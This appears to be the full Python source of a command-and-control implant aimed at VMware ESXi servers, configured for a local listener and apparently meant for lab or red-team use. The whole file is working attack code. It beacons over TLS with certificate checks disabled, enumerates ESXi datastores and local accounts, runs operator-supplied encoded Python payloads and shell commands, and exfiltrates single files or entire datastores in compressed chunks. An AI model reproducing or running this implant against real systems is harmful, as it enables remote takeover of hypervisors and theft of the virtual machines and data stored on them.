import os
import sys
import ssl
import zlib
import json
import shutil
import time as t
import socket
import base64
import hashlib
import logging
import platform
from datetime import datetime, time, date
import subprocess
from random import randrange


_LISTENER_HOST = "localhost"
_LISTENER_PORTS = [8080, 1234, 9001]
_LISTENER_SECRET = "whatever"
_AGENT_LOGLEVEL = logging.DEBUG
_AGENT_OPTIONS = {
    "BEACON_INTERVAL": 0.5,
    "BEACON_JITTER": 0,
    "START_TIME": str(time(0, 0, 0)),
    "END_TIME": str(time(23, 59, 0)),
    "SOCKET_TIMEOUT": 2,
    "PID_FILE": "/tmp/agent.pid",
    "TRANSFER_BLOCK_SIZE": 8192,
}

_AGENT_DEPLOYED_TS = date.today()

logging.basicConfig(level=_AGENT_LOGLEVEL, format="%(asctime)s %(message)s")


class Agent:
    def __init__(self):
        self.ssock = None
        self.uuid = self.get_uuid()
        self.enumdata = None

    def init_socket(self):
        context = ssl.create_default_context()
        context.minimum_version = ssl.TLSVersion.TLSv1_2
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        _AGENT_CIPHERS = "AES128-SHA"
        context.set_ciphers(_AGENT_CIPHERS)
        # logging.debug("Connecting socket")
        for port in _LISTENER_PORTS:
            # logging.debug("Attempting port: " + str(port))
            try:
                sock = socket.create_connection((_LISTENER_HOST, port))
                logging.debug("Connection to port " + str(port) + " succeeded.")
                sock.settimeout(_AGENT_OPTIONS["SOCKET_TIMEOUT"])
                logging.debug("Upgrading to TLS")
                self.ssock = context.wrap_socket(sock, server_hostname=_LISTENER_HOST)
                return True
            except:
                # logging.debug("Connection to port " + str(port) + " was not successful.")
                pass
        return False

    def enum_host(self):
        logging.debug("Enumerating host")
        host_platform = platform.platform()
        host_name = socket.gethostname()
        host_data = {"host_platform": host_platform, "host_name": host_name}

        enumdata = {"host_data": host_data, "agent_options": json.dumps(_AGENT_OPTIONS)}

        if "VMkernel" in host_platform:
            logging.debug("Beginning platform-specific ESXi enumeration")

            logging.debug("Enumerating mounts")
            host_mounts = {}
            m_fs_mounts = os.popen("esxcli storage filesystem list | grep ^/").read()
            for entry in m_fs_mounts.splitlines():
                entry = entry.split()
                m_mountpoint = entry[0]
                m_handle = entry[1]
                m_uuid = entry[2]
                m_type = entry[4]
                m_size = entry[5]
                m_free = entry[6]
                host_mounts[m_uuid] = {
                    "mountpoint": m_mountpoint,
                    "name": m_handle,
                    "type": m_type,
                    "size": m_size,
                    "free": m_free,
                }
            host_data["host_mounts"] = host_mounts

            logging.debug("Enumerating local users")
            host_local_users = {}
            l_users = os.popen("esxcli system account list").read()
            for entry in l_users.splitlines()[2:]:
                entry = entry.split()
                u_name = entry[0]
                u_desc = entry[1]
                host_local_users[u_name] = {"description": u_desc}
            host_data["host_local_users"] = host_local_users

        logging.debug(enumdata)
        return enumdata

    def get_uuid(self):
        """
        Method to generate UUID from host parameters for
        agent persistence.
        """
        logging.debug("Generating UUID")
        uuid_components = [socket.gethostname()]
        agent_uuid = hashlib.sha224("".join(uuid_components).encode()).hexdigest()[0:4]
        logging.debug(agent_uuid)
        return agent_uuid

    def tls_transact_msg(self, msg):
        """
        Method to allow the client to send a message to
        the listener using TLS.
        """
        logging.debug("Preparing to send packet")

        try:
            logging.debug("Sending packet")
            self.ssock.send(msg.encode())
            response = self.ssock.recv()
            logging.debug("LISTENER : " + response.decode())
            if response.decode() == "":
                response = False
        except Exception as e:
            logging.error(e)

            response = False
        return response

    def associate(self):
        """
        Association method. Creates the following packet structure:
        Association:
            _associate{ secret:"mysecret", uuid:"myuuid" }
        """
        logging.debug("Associating agent")
        associate_packet_stub = {
            "secret": _LISTENER_SECRET,
            "uuid": self.uuid,
            "enumdata": self.enumdata,
        }
        associate_pkt = "_associate" + json.dumps(associate_packet_stub)
        return self.tls_transact_msg(associate_pkt)

    def beacon(self):
        """
        Beacon method. Creates the following packet structure:
        Beacon:
            _beacon{ secret:"mysecret", uuid:"myuuid" }
        """
        logging.debug("Beaconing listener")
        beacon_packet_stub = {"secret": _LISTENER_SECRET, "uuid": self.uuid}
        beacon_pkt = "_beacon" + json.dumps(beacon_packet_stub)
        return self.tls_transact_msg(beacon_pkt)

    def send_file_segment(self, data, offset, file):
        logging.debug("Sending file segment")
        response_packet_stub = {
            "secret": _LISTENER_SECRET,
            "uuid": self.uuid,
            "status": "FILE_TRANSFER",
            "data": data,
            "offset": offset,
            "filename": file,
        }
        response_pkt = "_response" + json.dumps(response_packet_stub)
        return self.tls_transact_msg(response_pkt)

    def exfil_datastore(self, mountpoint):
        logging.debug("Exfiltrating datastore at " + mountpoint)
        for path, dirs, files in os.walk(mountpoint):
            for file in files:
                filename = os.path.join(path, file)
                relpath = os.path.relpath(filename, mountpoint)
                filesize = os.path.getsize(filename)
                print("Transfering " + filename)
                self.send_file(filename)

    def send_file(self, filename):
        logging.debug("Sending file")
        offset = 0
        try:
            file = open(filename, "rb")
        except FileNotFoundError:
            self.respond("FILE_NOT_FOUND_ERROR", "AGENT_ERROR")
            return
        except PermissionError:
            self.respond("PERMISSION_ERROR", "AGENT_ERROR")
            return
        while True:
            chunk_data = file.read(_AGENT_OPTIONS["TRANSFER_BLOCK_SIZE"])
            if not chunk_data:
                break
            chunk_data = zlib.compress(chunk_data)
            chunk_data = base64.b85encode(chunk_data).decode()
            self.send_file_segment(chunk_data, offset, os.path.basename(filename))
            offset = offset + _AGENT_OPTIONS["TRANSFER_BLOCK_SIZE"]

    def respond(self, msg, code):
        """
        Respond method. Creates the following packet structure:
        Response:
            _response{ secret:"mysecret", uuid:"myuuid", data:"cmd_response" }
        """
        logging.debug("Responding to listener")
        response_packet_stub = {
            "secret": _LISTENER_SECRET,
            "uuid": self.uuid,
            "status": code,
            "data": msg,
        }
        response_pkt = "_response" + json.dumps(response_packet_stub)
        return self.tls_transact_msg(response_pkt)

    def run_payload(self, payload):
        """
        Run a payload sent to the agent
        """
        logging.debug("Running a payload")
        logging.debug("========== Payload ==========")
        script = base64.b85decode(payload).decode().lstrip()
        logging.debug(script)
        try:
            process = subprocess.Popen(
                ["python3", "-c", script],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            (
                stdout,
                stderr,
            ) = (
                process.communicate()
            )  # TODO: Non-blocking queue for pipe communications

            if stdout:
                self.respond(stdout.decode(), "STDOUT")
            if stderr:
                self.respond(stderr.decode(), "STDERR")

        except Exception as e:
            self.respond(str(e), "AGENT_ERROR")

    def run_command(self, command):
        logging.debug("Running a command")
        command = base64.b85decode(command).decode()
        logging.debug("Command: " + command)
        stdout = None
        stderr = None
        try:
            process = subprocess.Popen(
                command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            stdout, stderr = process.communicate()
            stdout = stdout.decode()
            stderr = stderr.decode()
        except FileNotFoundError:
            stderr = "No such file or directory"
        except PermissionError:
            stderr = "Permission denied"

        if stdout:
            self.respond(stdout, "STDOUT")
        if stderr:
            self.respond(stderr, "STDERR")

    def run_task(self, task):
        logging.debug("Running a task")
        task = json.loads(base64.b85decode(task).decode())

        if task["cmd"] == "GET_FILE":
            file = task["file"]
            logging.debug("GET_FILE: " + file)
            self.send_file(file)

        if task["cmd"] == "EXFIL_DATASTORE":
            mountpoint = task["mountpoint"]
            logging.debug("EXFIL_DATASTORE: " + mountpoint)
            self.exfil_datastore(mountpoint)

    def write_pid_file(self):
        my_pid = str(os.getpid())
        pidfile = open(_AGENT_OPTIONS["PID_FILE"], "w")
        pidfile.write(my_pid)
        pidfile.close()

    def is_running(self):
        if not os.path.exists(_AGENT_OPTIONS["PID_FILE"]):
            return False
        pidfile = open(_AGENT_OPTIONS["PID_FILE"], "r")
        pid = pidfile.read()
        logging.debug("PID file found with PID: " + pid)
        logging.debug("Checking if stale")
        try:
            os.kill(int(pid), 0)
            logging.debug("PID is still active!")
            return True
        except OSError:
            return False

    def run(self):
        self.enumdata = self.enum_host()

        _AGENT_STATE_ENUM = 0
        while True:
            t.sleep(
                _AGENT_OPTIONS["BEACON_INTERVAL"]
                + randrange(_AGENT_OPTIONS["BEACON_JITTER"])
                if _AGENT_OPTIONS["BEACON_JITTER"] > 0
                else _AGENT_OPTIONS["BEACON_INTERVAL"]
            )
            start_time = datetime.strptime(
                _AGENT_OPTIONS["START_TIME"], "%H:%M:%S"
            ).time()
            current_time = datetime.now().time()
            end_time = datetime.strptime(_AGENT_OPTIONS["END_TIME"], "%H:%M:%S").time()
            if start_time <= current_time <= end_time:
                if _AGENT_STATE_ENUM == 0:
                    if self.init_socket():
                        _AGENT_STATE_ENUM = 1
                if _AGENT_STATE_ENUM == 1:
                    if self.associate():
                        _AGENT_STATE_ENUM = 2
                if _AGENT_STATE_ENUM == 2:
                    beacon_response = self.beacon()
                    if beacon_response is False:
                        _AGENT_STATE_ENUM = 0
                        pass
                    else:
                        cmd = json.loads(beacon_response[9:])
                        if cmd["payload"]:
                            self.run_payload(cmd["payload"])
                        if cmd["command"]:
                            self.run_command(cmd["command"])
                        if cmd["task"]:
                            self.run_task(cmd["task"])


if __name__ == "__main__":
    logging.debug("Starting agent")
    agent = Agent()
    logging.debug("Checking PID file")
    if agent.is_running():
        logging.debug("Exiting")
        sys.exit(0)
    else:
        logging.debug("Launching agent")
        agent.write_pid_file()
        agent.run()
